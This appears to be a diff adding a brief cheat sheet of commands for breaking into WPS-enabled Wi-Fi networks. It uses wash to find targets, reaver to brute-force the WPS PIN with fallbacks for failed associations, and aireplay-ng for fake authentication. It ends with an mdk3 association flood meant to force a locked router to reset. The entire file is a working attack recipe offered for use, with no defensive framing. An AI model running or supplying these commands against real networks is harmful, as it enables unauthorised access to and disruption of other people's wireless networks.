@@ -1,0 +1,23 @@
+# scan WPS feature wifi
+wash -i wlan0
+
+# reaver brute force
+reaver --bssid [bssid] --channel [channel] -i wlan0
+
+# in case of fail to associate, associate manually in a seperate terminal
+reaver --bssid [bssid] --channel [channel] -i wlan0 -A
+aireplay-ng --fakeauth 100 -a [bssid] -h [own mac] wlan0
+
+# in case of still failing, try to see more message output
+reaver --bssid [bssid] --channel [channel] -i wlan0 -A -vvv
+
+# in case of failing WCA NACK transaction, timeout
+reaver --bssid [bssid] --channel [channel] -i wlan0 -A -vvv --no-nacks
+
+# analyze -vvv and see more options to debug reaver
+reaver -h
+
+# in case WPS locked, let it fake associate for 10,000 or more clients to let it reset
+mdk3 wlan0 a -a [bssid] -m
+
+
